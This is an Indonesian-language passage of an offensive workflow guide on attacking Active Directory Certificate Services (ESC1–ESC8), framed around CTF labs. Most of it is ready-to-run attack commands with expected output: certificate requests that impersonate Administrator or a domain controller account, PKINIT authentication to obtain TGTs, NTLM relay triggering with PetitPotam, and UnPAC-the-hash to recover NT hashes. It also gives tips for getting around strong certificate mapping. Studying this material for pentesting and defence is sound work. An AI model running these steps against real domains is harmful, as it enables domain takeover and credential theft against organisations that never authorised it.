KDC says:
"Can I strongly map this certificate
to Administrator?"
       │
   ┌───┴────┐
  YES       NO
   │         │
   ▼         ▼
  TGT       reject
```

Inilah alasan command:

```text
certipy req -upn administrator@domain.local
```

tidak boleh dipahami sebagai:

```text
guaranteed Administrator
```

---

# 🧩 13.5 `CERTSRV_E_UNSUPPORTED_CERT_TYPE`

Contoh:

```text
[-] Got error while trying to request certificate:
0x80094800
CERTSRV_E_UNSUPPORTED_CERT_TYPE
```

Kemungkinan:

```text
Template tidak dipublish CA
Template disabled
CA tidak mendukung template
Nama template salah
```

Check:

```bash
# Re-enumerate CA/template relationship
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

---

# 🪪 13.6 ESC3 `BAD_RENEWAL_SUBJECT`

Error:

```text
CERTSRV_E_BAD_RENEWAL_SUBJECT
```

dapat muncul ketika request on-behalf-of tidak memenuhi issuance requirements.

Checklist:

```text
[ ] Agent certificate valid
[ ] Target template accepts agent
[ ] Authorized signatures requirement satisfied
[ ] Agent application policy correct
[ ] Target user has enrollment rights
[ ] Template schema/issuance policy sesuai
```

Issue reports pada Certipy menunjukkan bahwa ESC3 false positives/misconfigurations dapat muncul ketika target template meminta signature atau tidak memenuhi agent policy.

---

# 🌐 13.7 ESC8 Tidak Menghasilkan Certificate

Checklist:

```text
[ ] Web Enrollment aktif?
[ ] Target URL benar?
[ ] NTLM diterima?
[ ] Relay listener menerima authentication?
[ ] Template cocok dengan relayed principal?
[ ] CA dapat issue certificate?
[ ] Channel binding / EPA menghalangi relay?
[ ] Strong certificate mapping menghalangi auth?
```

Penting:

```text
Relay authentication succeeded
         ≠
Certificate authentication succeeded
```

---

# 🔐 13.8 CA Name vs CA Hostname

Ini sangat sering membingungkan pemula.

Contoh:

```text
CA Name:
CORP-CA
```

sedangkan:

```text
CA Hostname:
ca.corp.local
```

Mereka bukan string yang sama.

Pada command tertentu:

```bash
# CA display name
-ca "CORP-CA"
```

sedangkan:

```bash
# Target/hostname
-target "ca.corp.local"
```

Gunakan hasil:

```text
certipy find
```

sebagai sumber ground truth.

---

# 🧠 14. GOLDEN RULES AD CS

## Rule 1 — 🪪 Certificate Bukan Sekadar File

```text
PFX
 =
certificate
 +
private key
```

Perlakukan seperti credential.

---

## Rule 2 — 🔐 Certificate Dapat Outlive Password

Password reset:

```text
password revoked/changed
```

tidak otomatis berarti:

```text
all certificates revoked
```

---

## Rule 3 — 🔎 Selalu Jalankan `certipy find`

Saat pertama kali mendapatkan foothold domain:

```bash
# Enumerate AD CS attack surface
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

AD CS seharusnya masuk checklist enumeration standar.

---

## Rule 4 — 🔥 ESC1 adalah Kandidat Pertama yang Harus Dicek

Cari:

```text
Enrollee Supplies Subject
+
Client Authentication
+
Enrollment Rights
```

---

## Rule 5 — 🧩 ESC2 Tidak Otomatis DA

```text
ESC2
   │
   ▼
Any Purpose certificate
```

Kemudian mungkin:

```text
agent capability
```

bukan:

```text
instant DA
```

---

## Rule 6 — 🎭 ESC3 Biasanya Membutuhkan Dua Template

Ingat:

```text
Template A
 = Enrollment Agent

Template B
 = Target certificate
```

---

## Rule 7 — 📝 ESC4 = Template ACL

Jika BloodHound menunjukkan:

```text
GenericWrite
WriteDACL
WriteOwner
GenericAll
```

ke certificate template:

```text
STOP
   │
   ▼
Check ESC4
```

---

## Rule 8 — 🔵 ESC6 Berbeda dari ESC1

```text
ESC1
= template misconfiguration

ESC6
= CA-level EditFlags
```

---

## Rule 9 — 🏢 ESC7 Berhubungan dengan CA ACL

```text
Template ACL
    ≠
CA ACL
```

Jangan mencampur keduanya.

---

## Rule 10 — 🔄 ESC8 = NTLM Relay + AD CS

```text
NTLM Relay
     +
Web Enrollment
     =
ESC8
```

---

## Rule 11 — ⏰ Clock Sync

Sebelum debugging PKINIT/Kerberos:

```bash
date
```

---

## Rule 12 — 🧠 Issuance ≠ Authentication

Ini mungkin rule paling penting.

```text
Certificate issued
        ≠
Certificate accepted for target identity
```

Di antara keduanya ada:

```text
EKU
+
mapping
+
KDC
+
policy
```

---

## Rule 13 — 🆔 Jangan Abaikan Strong Mapping

Modern environment dapat menggunakan SID extension dan stronger certificate binding.

Akibatnya:

```text
UPN spoof
```

tidak selalu cukup.

---

## Rule 14 — 📦 PFX ≠ CCACHE

```text
PFX
  = certificate/private key

CCACHE
  = Kerberos credential cache
```

---

## Rule 15 — 🧹 Cleanup

Setelah lab/pentest:

```text
restore template
remove temporary changes
delete temporary accounts/certs where applicable
document changes
```

---

# ⚡ 15. CHEATSHEET AD CS

## 15.1 🔎 Enumeration — 2 Commands

```bash
# [1] Enumerate all CA/template vulnerabilities
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout
```

```bash
# [2] Save detailed enumeration
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -output adcs_enum
```

---

# 🔥 15.2 ESC1 — 3 Commands

```bash
# [1] Request certificate using vulnerable template
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$TEMPLATE" \
    -upn "administrator@$DOMAIN" \
    -dc-ip "$DC_IP"
```

```bash
# [2] Authenticate using resulting PFX
certipy auth \
    -pfx administrator.pfx \
    -dc-ip "$DC_IP"
```

```bash
# [3] Load the Kerberos cache
export KRB5CCNAME="$PWD/administrator.ccache"
```

---

# 🌐 15.3 ESC8 — 3 Commands

```bash
# [1] Confirm Web Enrollment / ESC8 indicators
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout |
    grep -i -E "web enrollment|ESC8"
```

```bash
# [2] Start AD CS relay listener
certipy relay \
    -target "http://$CA_HOST" \
    -template "DomainController"
```

```bash
# [3] Trigger a lab authentication to the relay listener
python3 PetitPotam.py \
    "$TARGET" \
    "$DC_IP"
```

---

# 🎫 15.4 Certificate → TGT — 2 Commands

```bash
# Method 1: Certipy
certipy auth \
    -pfx "$PFX" \
    -dc-ip "$DC_IP"
```

```bash
# Method 2: PKINIT tools
python3 gettgtpkinit.py \
    -cert-pfx "$PFX" \
    "$DOMAIN/$USERNAME" \
    "$USERNAME.ccache"
```

---

# 🔓 15.5 Certificate → NTLM Hash — 1 Command

```bash
# Use the PKINIT session key to perform UnPAC-the-hash
python3 getnthash.py \
    -key "$TGT_SESSION_KEY" \
    "$DOMAIN/$USERNAME"
```

---

# 🗺️ 16. CROSS-WORKFLOW

## ← File 39 — AD Delegation

File 39:

```text
Kerberos Delegation
```

File 40:

```text
AD CS
```

Keduanya adalah:

```text
Alternative privilege escalation path
```

Mental model:

```text
Initial Access
      │
      ▼
AD Enumeration
      │
 ┌────┴─────┐
 ▼          ▼
Delegation  AD CS
 │          │
 ▼          ▼
S4U        Certificate
 │          │
 ▼          ▼
Privilege / Authentication
```

← [**File 39: AD Delegation**](https://chatgpt.com/39-ad-delegation/[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation))

---

# ← File 38 — AD ACL Abuse

AD CS dan ACL memiliki hubungan yang kuat.

Contoh:

```text
GenericWrite
     │
     ▼
Certificate Template
     │
     ▼
ESC4
```

atau:

```text
ManageCA
     │
     ▼
CA
     │
     ▼
ESC7
```

Mental model:

```text
ACL
 │
 ├── Computer Object → RBCD
 │
 ├── Template Object → ESC4
 │
 └── CA Object       → ESC7
```

← [**File 38: AD ACL Abuse**](https://chatgpt.com/38-ad-acl-abuse/[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse))

---

# → File 41 — NTLM Relay

ESC8 adalah jembatan paling jelas ke File 41.

```text
NTLM Relay
    │
    └── Target
          │
          ├── LDAP
          ├── SMB
          └── AD CS HTTP
                    │
                    ▼
                  ESC8
```

Jadi:

```text
File 41
= understanding relay primitive

File 40
= applying relay primitive against AD CS
```

→ [**File 41: NTLM Relay**](/docs/ntlm-relay)

---

# → File 43 — Domain Persistence

Certificate dapat menjadi persistence mechanism.

Misalnya:

```text
Account
   │
   ▼
Certificate
   │
   ▼
Authentication
```

Certificate memiliki:

```text
validity period
```

dan tidak otomatis hilang hanya karena password account berubah.

Tetapi persistence melalui certificate tetap bergantung pada:

```text
certificate validity
revocation
private key possession
certificate mapping
CA trust
```

→ [**File 43: Domain Persistence**](/docs/domain-persistence)

---

# 🧠 17. FINAL MENTAL MODEL

Jangan hafalkan:

```text
ESC1 command
ESC2 command
ESC3 command
ESC4 command
...
```

secara terpisah.

Hafalkan hubungan berikut:

```text
                         AD CS
                           │
          ┌────────────────┼────────────────┐
          │                │                │
          ▼                ▼                ▼
         CA             Template        Enrollment
          │                │                │
          │                │                │
          ▼                ▼                ▼
        ESC7        ESC1 / ESC2 / ESC3    Who can enroll?
          │                │
          │                ▼
          │             Certificate
          │                │
          └────────────────┤
                           ▼
                    Certificate Mapping
                           │
                           ▼
                      Authentication
                           │
                    ┌──────┴───────┐
                    ▼              ▼
                  PKINIT         Schannel
                    │
                    ▼
                   TGT
                    │
              ┌─────┴─────┐
              ▼           ▼
           CCACHE      Session Key
                           │
                           ▼
                         UnPAC
                           │
                           ▼
                        NT Hash
```

---

# 🧠 17.1 ESC Mental Model

## ESC1

```text
"WHO AM I allowed to request as?"
```

```text
Attacker
   │
   └── controls subject/SAN
          │
          ▼
       Target identity
```

---

## ESC2

```text
"How broad is the certificate's purpose?"
```

```text
Any Purpose
     │
     ├── authentication
     ├── other uses
     └── possible agent capability
```

---

## ESC3

```text
"Can this certificate act on behalf of someone?"
```

```text
Agent
  │
  └── on behalf of
          │
          ▼
        User
```

---

## ESC4

```text
"Can I modify the template?"
```

```text
Template ACL
     │
     ▼
Modify
     │
     ▼
ESC1-like configuration
```

---

## ESC6

```text
"Can CA-level configuration override subject/SAN behavior?"
```

---

## ESC7

```text
"Can I control the CA?"
```

---

## ESC8

```text
"Can I relay NTLM to AD CS?"
```

---

# 🎯 17.2 CTF Muscle Memory

Ketika mendapatkan domain user:

```text
1. certipy find
        │
        ▼
2. Search:
        │
        ├── ESC1
        ├── ESC2
        ├── ESC3
        ├── ESC4
        ├── ESC6
        ├── ESC7
        └── ESC8
        │
        ▼
3. Identify prerequisite
        │
        ▼
4. Verify enrollment/ACL/CA condition
        │
        ▼
5. Request or obtain certificate
        │
        ▼
6. Inspect PFX
        │
        ▼
7. certipy auth / PKINIT
        │
        ▼
8. TGT
        │
        ▼
9. ccache
        │
        ├── Kerberos access
        │
        └── UnPAC → NT hash
```

---

# ✅ 17.3 AD CS Enumeration Checklist

```text
[ ] Did I identify every Enterprise CA?
[ ] Did I identify CA hostname?
[ ] Did I identify CA name?
[ ] Did I identify Web Enrollment?
[ ] Did I enumerate all published templates?
[ ] Did I identify Enabled vs Disabled?
[ ] Did I check Enrollment Rights?
[ ] Did I check Client Authentication EKU?
[ ] Did I check Enrollee Supplies Subject?
[ ] Did I check Any Purpose?
[ ] Did I check Certificate Request Agent?
[ ] Did I inspect template ACL?
[ ] Did I inspect CA ACL?
[ ] Did I check ESC1?
[ ] Did I check ESC2?
[ ] Did I check ESC3?
[ ] Did I check ESC4?
[ ] Did I check ESC6?
[ ] Did I check ESC7?
[ ] Did I check ESC8?
[ ] Did I check certificate mapping?
[ ] Did I check SID extension behavior?
[ ] Did I sync clock?
[ ] Did I save PFX securely?
[ ] Did I understand PFX vs ccache vs kirbi?
[ ] Did I verify whether certificate authentication succeeded?
[ ] Did I distinguish issuance from authentication?
```

---

# 🏁 18. ONE-MINUTE SUMMARY

```text
AD CS
 │
 ├── CA
 │     │
 │     ├── ESC6
 │     ├── ESC7
 │     └── ESC8
 │
 └── Templates
       │
       ├── ESC1
       ├── ESC2
       ├── ESC3
       └── ESC4
```

### ESC1

```text
SAN/Subject controlled
+
Client Authentication
+
Enrollment
=
Certificate impersonation candidate
```

### ESC2

```text
Any Purpose / No EKU
=
broad certificate purpose
```

### ESC3

```text
Enrollment Agent
+
Target template
=
certificate on behalf of another user
```

### ESC4

```text
Write template
=
modify template
=
ESC1-like attack
```

### ESC6

```text
CA SAN attribute
=
arbitrary SAN request capability
```

### ESC7

```text
CA ACL
=
CA management abuse
```

### ESC8

```text
NTLM Relay
+
AD CS Web Enrollment
=
certificate issuance via relay
```

---

# 🧠 FINAL GOLDEN MENTAL MODEL

```text
                 "CAN I GET A CERTIFICATE?"
                            │
                            ▼
                       certipy find
                            │
                            ▼
                 "WHO CAN ENROLL?"
                            │
                            ▼
                  "WHAT CAN I ENROLL?"
                            │
                            ▼
              ┌─────────────┴─────────────┐
              │                           │
              ▼                           ▼
       Vulnerable Template             CA Weakness
              │                           │
      ┌───────┼────────┐          ┌───────┼───────┐
      ▼       ▼        ▼          ▼       ▼       ▼
     ESC1    ESC2     ESC3       ESC6    ESC7    ESC8
      │       │        │          │       │       │
      └───────┴────────┴──────────┴───────┴───────┘
                            │
                            ▼
                       CERTIFICATE
                            │
                            ▼
                   CERTIFICATE MAPPING
                            │
                            ▼
                         PKINIT
                            │
                            ▼
                           TGT
                            │
                    ┌───────┴────────┐
                    ▼                ▼
                  CCACHE          Session Key
                    │                │
                    ▼                ▼
                Kerberos          UnPAC
                 access              │
                                     ▼
                                  NT HASH
```

> **Kalimat yang harus tertanam di kepala saat CTF:**
> 
> **"Jangan cuma cari certificate template. Cari siapa yang boleh enroll, apa yang certificate boleh lakukan, identity mana yang dapat diminta, siapa yang dapat memodifikasi template/CA, dan bagaimana certificate tersebut nantinya dipetakan ke AD."**

---

# 📌 19. QUICK REFERENCE — WHAT TO ASK YOURSELF

```text
[ENUMERATION]

Apa CA-nya?
   ↓
Apa hostname CA?
   ↓
Apa template yang dipublish?
   ↓
Siapa yang dapat enroll?
   ↓
Ada Client Authentication?
   ↓
Ada SAN control?
   ↓
Ada Any Purpose?
   ↓
Ada Enrollment Agent?
   ↓
Ada template ACL abuse?
   ↓
Ada CA ACL abuse?
   ↓
Ada Web Enrollment?
```

Kemudian:

```text
[EXPLOIT DECISION]

ESC1?
  → request certificate
  → authenticate

ESC2?
  → obtain Any Purpose certificate
  → inspect agent/target path

ESC3?
  → obtain agent certificate
  → on-behalf-of target

ESC4?
  → modify template
  → turn into suitable vulnerable configuration
  → request certificate

ESC6?
  → inspect CA SAN behavior
  → validate mapping

ESC7?
  → inspect CA-management rights
  → combine with suitable certificate path

ESC8?
  → NTLM relay
  → certificate
  → validate mapping
```

---

# 🛡️ 20. ATTACK CHAIN VS REAL RESULT

Selalu bedakan tiga level berikut:

```text
LEVEL 1
Can request certificate?
       │
       ▼
       YES
```

```text
LEVEL 2
Can certificate authenticate?
       │
       ▼
       YES
```

```text
LEVEL 3
Does authenticated identity have privileged access?
       │
       ▼
       YES
```

Jangan menyamakan:

```text
Level 1
```

dengan:

```text
Domain Admin
```

Attack path yang benar:

```text
Misconfiguration
      │
      ▼
Certificate Issuance
      │
      ▼
Certificate Authentication
      │
      ▼
Identity Mapping
      │
      ▼
Privileges of Mapped Identity
      │
      ▼
Actual Impact
```

Itulah cara membaca AD CS secara benar dan bukan sekadar menjalankan command sampai keluar file `.pfx`.

---

# [🔐 Workflow 40 — Active Directory Certificate Services (AD CS)](/docs/adcs) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export DC_IP="10.10.10.10"
export CA_IP="10.10.10.11"          # Bisa sama dengan DC atau server terpisah
export DOMAIN="corp.local"
export DOMAIN_UPPER="CORP.LOCAL"
export TARGET="10.10.10.10"
export LHOST="10.10.14.5"
export USERNAME="lowprivuser"
export PASSWORD="Password123!"

mkdir -p ~/adcs_loot/{certs,tickets,creds,enum}
cd ~/adcs_loot

# Setup /etc/hosts
echo "$DC_IP dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts

# Setup /etc/krb5.conf (WAJIB untuk Kerberos/PKINIT)
cat > /tmp/krb5_setup.sh << 'EOF'
DOMAIN_UPPER="CORP.LOCAL"
DC_IP="10.10.10.10"
sudo bash -c "cat > /etc/krb5.conf << KRBEOF
[libdefaults]
    default_realm = ${DOMAIN_UPPER}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
    forwardable = true

[realms]
    ${DOMAIN_UPPER} = {
        kdc = ${DC_IP}
        admin_server = ${DC_IP}
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
KRBEOF"
EOF
bash /tmp/krb5_setup.sh

# Install Certipy jika belum ada
which certipy || pip3 install certipy-ad

# Sync waktu WAJIB sebelum operasi Kerberos
sudo ntpdate -u $DC_IP
echo "[*] DC: $DC_IP | CA: $CA_IP | Domain: $DOMAIN"
```

**Output yang diharapkan:**

text

```
[*] DC: 10.10.10.10 | CA: 10.10.10.11 | Domain: corp.local
```

---

## ═══════════════════════════════════════

## FASE 0: DETEKSI AD CS EXISTENCE

## ═══════════════════════════════════════

### Langkah 0.1 — Cek Apakah AD CS Ada di Environment

Bash

```
# Command 1: Cek via LDAP/nmap apakah ada Certificate Authority
nmap -p 80,443,8080 $DC_IP $CA_IP --open 2>/dev/null | grep -E "open|certsrv"

# Command 2: Cek endpoint /certsrv/ via HTTP (indicator Web Enrollment aktif)
curl -sk "http://$CA_IP/certsrv/" -o /dev/null -w "%{http_code}" && echo ""
curl -sk "https://$CA_IP/certsrv/" -o /dev/null -w "%{http_code}" && echo ""

# Command 3: Cek via LDAP langsung (paling reliable)
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
    "(objectClass=certificationAuthority)" \
    cn \
    2>/dev/null | grep "cn:"
```

**OUTPUT BERHASIL ✅ — AD CS ditemukan:**

text

```
cn: CORP-CA
```

➡️ AD CS ada! Simpan nama CA:

Bash

```
export CA_NAME="CORP-CA"
echo "CA_NAME=$CA_NAME" >> ~/adcs_loot/enum/info.txt
```

➡️ Lanjut ke **Fase 1 — Enumeration**

**OUTPUT BERHASIL ✅ — Web Enrollment aktif (HTTP 200 atau 401):**

text

```
401
```

➡️ HTTP 401 = Web Enrollment ada tapi butuh auth = kandidat **ESC8**. Catat ini!

Bash

```
echo "WEB_ENROLLMENT=active" >> ~/adcs_loot/enum/info.txt
echo "CA_HTTP=http://$CA_IP/certsrv/" >> ~/adcs_loot/enum/info.txt
```

**OUTPUT GAGAL ❌ — LDAP error / tidak ada CA:**

text

```
# No results returned
```

➡️ AD CS mungkin tidak ada di environment ini, atau LDAP diblokir:

Bash

```
# Coba via SMB enumeration
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --shares | grep -i "cert"
# Atau cek service di DC
nmap -sV -p 9389 $DC_IP  # AD Web Services port
```

---

### Langkah 0.2 — Cek CA Hostname dan DNS Name

Bash

```
# Dapatkan detail CA dari LDAP
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" \
    "(objectClass=pKIEnrollmentService)" \
    cn dNSHostName \
    2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
dn: CN=CORP-CA,CN=Enrollment Services,...
cn: CORP-CA
dNSHostName: ca01.corp.local
```

Bash

```
# Simpan dan tambahkan ke /etc/hosts
export CA_HOSTNAME="ca01.corp.local"
export CA_NAME="CORP-CA"
echo "$CA_IP $CA_HOSTNAME" | sudo tee -a /etc/hosts
```

---

## ═══════════════════════════════════════

## FASE 1: ENUMERATION AD CS (CERTIPY FIND)

## ═══════════════════════════════════════

> **TUJUAN:** Identifikasi semua ESC yang ada. Ini adalah langkah TERPENTING — jangan skip, jangan terburu-buru baca outputnya.

### Langkah 1.1 — Certipy Find (Primary Enumeration)

Bash

```
# Command 1: Tampilkan ke stdout (cepat, untuk review langsung)
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout \
    2>/dev/null | tee ~/adcs_loot/enum/certipy_find.txt

# Command 2: Simpan ke file JSON untuk review detail
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -output ~/adcs_loot/enum/adcs_enum \
    2>/dev/null

# Command 3: Jika punya NTLM hash (tidak ada password)
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -hashes "$NTLM_HASH" \
    -dc-ip "$DC_IP" \
    -stdout 2>/dev/null
```

**OUTPUT BERHASIL ✅ — ESC1 Ditemukan (JACKPOT paling umum di CTF):**

text

```
Certificate Authorities
  0
    CA Name                             : CORP-CA
    DNS Name                            : ca01.corp.local
    Web Enrollment                      : Enabled

Certificate Templates
  0
    Template Name                       : VulnUserTemplate
    Display Name                        : VulnUserTemplate
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CORP.LOCAL\Domain Users

    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication
```

**Cara baca output — WAJIB dipahami:**

|Field|Nilai Berbahaya|Arti|
|---|---|---|
|`Enrollee Supplies Subject: True`|True|Attacker bisa tentukan UPN/SAN → ESC1|
|`Client Authentication: True`|True|Certificate bisa untuk auth Kerberos|
|`Requires Manager Approval: False`|False|Request langsung di-approve otomatis|
|`Authorized Signatures Required: 0`|0|Tidak butuh tanda tangan tambahan|
|`Enrollment Rights: Domain Users`|Domain Users|Semua user domain bisa enroll|
|`Web Enrollment: Enabled`|Enabled|Kandidat ESC8 (NTLM Relay)|

Bash

```
# Filter cepat untuk lihat semua vulnerability yang ditemukan
grep -A3 "Vulnerabilities" ~/adcs_loot/enum/certipy_find.txt
grep -E "ESC[0-9]" ~/adcs_loot/enum/certipy_find.txt
```

**OUTPUT BERHASIL ✅ — Multiple ESC ditemukan:**

text

```
    [!] Vulnerabilities
      ESC1  : Enrollee supplies subject...
      ESC4  : User has dangerous permissions
      ESC8  : Web Enrollment is enabled
```

➡️ Prioritaskan: **ESC1 dulu** (paling langsung), lalu ESC4, lalu ESC8.

**OUTPUT GAGAL ❌ — Clock skew error:**

text

```
[-] Got error while trying to get data: LDAP Error: {'result': 49, 'message': 'Clock skew...'}
```

➡️ **WAJIB SYNC WAKTU DULU:**

Bash

```
sudo ntpdate -u $DC_IP
# Ulangi certipy find
```

**OUTPUT GAGAL ❌ — Authentication error:**

text

```
[-] Got error: LDAP Error: invalid credentials
```

➡️ Credentials salah. Verifikasi dulu:

Bash

```
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"
```

**OUTPUT GAGAL ❌ — No vulnerabilities found:**

text

```
# Output hanya menampilkan template tapi tidak ada [!] Vulnerabilities
```

➡️ Masih bisa ada ESC yang tidak terdeteksi otomatis. Cek manual:

Bash

```
# Cari template dengan Enrollment Rights = Domain Users + Client Auth = True
grep -B5 -A20 "Domain Users" ~/adcs_loot/enum/certipy_find.txt | grep -A10 "Client Authentication"

# Google: "certipy find no vulnerabilities AD CS manual" untuk teknik advanced
```

---

### Langkah 1.2 — Certify (Jika Sudah Punya Windows Shell)

PowerShell

```
# Di Windows shell
.\Certify.exe find /vulnerable
.\Certify.exe cas
.\Certify.exe find /clientauth  # Cari semua template dengan Client Auth
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Action: Find certificate templates
[*] Listing info about the Enterprise CA 'CORP-CA'

    Enterprise CA Name            : CORP-CA
    DNS Hostname                  : ca01.corp.local

    [*] Template Name              : VulnUserTemplate
        [!] Vulnerabilities:
            ESC1: ...
```

---

### Langkah 1.3 — BloodHound AD CS Queries

Bash

```
# Collect BloodHound data termasuk AD CS (jika belum ada)
bloodhound-python \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -ns $DC_IP \
    -d $DOMAIN \
    -c All \
    --zip \
    -o ~/adcs_loot/enum/bloodhound/ 2>/dev/null
```

**Di Neo4j Browser, jalankan queries ini:**

cypher

```
// Query 1: Cari user yang bisa enroll ke template vulnerable
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:Enroll|GenericAll|AllExtendedRights]->(ct:CertTemplate)
WHERE ct.enrolleesuppliessubject = true AND ct.authenticationenabled = true
RETURN u.name, ct.name

// Query 2: Template dengan GenericWrite (kandidat ESC4)  
MATCH p=(u)-[r:GenericWrite|WriteDacl|GenericAll]->(ct:CertTemplate)
RETURN u.name, ct.name, type(r)

// Query 3: Siapa yang bisa manage CA (kandidat ESC7)
MATCH p=(u)-[r:ManageCA|ManageCertificates]->(ca:EnterpriseCA)
RETURN u.name, ca.name, type(r)
```

---

## ═══════════════════════════════════════

## FASE 2: ESC1 — ENROLLEE SUPPLIES SUBJECT

## ═══════════════════════════════════════

> **Masuk sini jika:** certipy find menampilkan `ESC1` pada template yang bisa kamu enroll.

### Langkah 2.1 — Konfirmasi Prerequisites ESC1

Bash

```
# Checklist manual sebelum request
# Dari output certipy find, verifikasi semua ini:

grep -A30 "VulnUserTemplate" ~/adcs_loot/enum/certipy_find.txt | \
    grep -E "Client Authentication|Enrollee Supplies Subject|Manager Approval|Authorized Signatures|Enrollment Rights"
```

**OUTPUT BERHASIL ✅ — Semua prerequisite terpenuhi:**

text

```
    Client Authentication               : True     ← HARUS True
    Enrollee Supplies Subject           : True     ← HARUS True
    Requires Manager Approval           : False    ← HARUS False
    Authorized Signatures Required      : 0        ← HARUS 0
    Enrollment Rights               : CORP.LOCAL\Domain Users  ← kamu harus member
```

---

### Langkah 2.2 — Request Certificate ESC1 (Impersonasi Administrator)

Bash

```
# Set template dan target yang akan diimpersonasi
export TEMPLATE="VulnUserTemplate"
export IMPERSONATE="administrator@$DOMAIN"

# Request certificate dengan UPN Administrator
certipy req \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -ca "$CA_NAME" \
    -template "$TEMPLATE" \
    -upn "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅ — Certificate berhasil di-request:**

text

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 42
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

Bash

```
# Simpan PFX ke folder yang benar
mv administrator.pfx ~/adcs_loot/certs/
ls -la ~/adcs_loot/certs/administrator.pfx
```

➡️ Lanjut ke **Langkah 2.3 — Authenticate dengan PFX**

**OUTPUT GAGAL ❌ — CERTSRV_E_UNSUPPORTED_CERT_TYPE:**

text

```
[-] Got error while trying to request certificate: CERTSRV_E_UNSUPPORTED_CERT_TYPE
```

➡️ Template tidak dipublish oleh CA, atau nama template salah:

Bash

```
# Cek nama template yang exact dari certipy find output
grep "Template Name" ~/adcs_loot/enum/certipy_find.txt

# Coba dengan nama yang berbeda (case sensitive!)
certipy req -u "$USERNAME@$DOMAIN" -p "$PASSWORD" \
    -ca "$CA_NAME" -template "User" -upn "$IMPERSONATE" -dc-ip "$DC_IP"
```

**OUTPUT GAGAL ❌ — Access Denied / Enrollment Rights:**

text

```
[-] Got error while trying to request certificate: CERTSRV_E_TEMPLATE_DENIED
```

➡️ User tidak punya enrollment rights ke template ini:

Bash

```
# Cek grup mana yang punya enrollment rights
grep -A5 "Enrollment Rights" ~/adcs_loot/enum/certipy_find.txt

# Cek apakah user kamu member dari grup tersebut
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" \
    --query "(sAMAccountName=$USERNAME)" "memberOf"
```

**OUTPUT GAGAL ❌ — KRB_AP_ERR_SKEW (Clock Skew):**

text

```
[-] Got error: KRB_AP_ERR_SKEW(Clock skew too great)
```

➡️ **SYNC WAKTU DULU:**

Bash

```
sudo ntpdate -u $DC_IP
# Ulangi command request
```

**OUTPUT GAGAL ❌ — Strong Certificate Mapping Error:**

text

```
[-] Got certificate but authentication will likely fail due to strong mapping requirements
```

➡️ Environment menggunakan strict SID-based mapping. Coba target yang berbeda:

Bash

```
# Coba impersonasi user lain selain Administrator (mungkin SID mismatch)
# Misalnya DC machine account
certipy req -u "$USERNAME@$DOMAIN" -p "$PASSWORD" \
    -ca "$CA_NAME" -template "$TEMPLATE" \
    -upn "DC01\$@$DOMAIN" -dc-ip "$DC_IP"

# Atau target user dengan SID yang sesuai dengan certificate
# Google: "certipy strong certificate mapping bypass [tahun]"
```

---

### Langkah 2.3 — Authenticate dengan PFX (PKINIT)

Bash

```
cd ~/adcs_loot/certs/

# Authenticate menggunakan certificate
certipy auth \
    -pfx administrator.pfx \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅ — TGT dan NT Hash didapat:**

text

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got NT hash for 'administrator@corp.local': fc525c9683e8fe067095ba2ddc971881
```

Bash

```
# Simpan semua credential
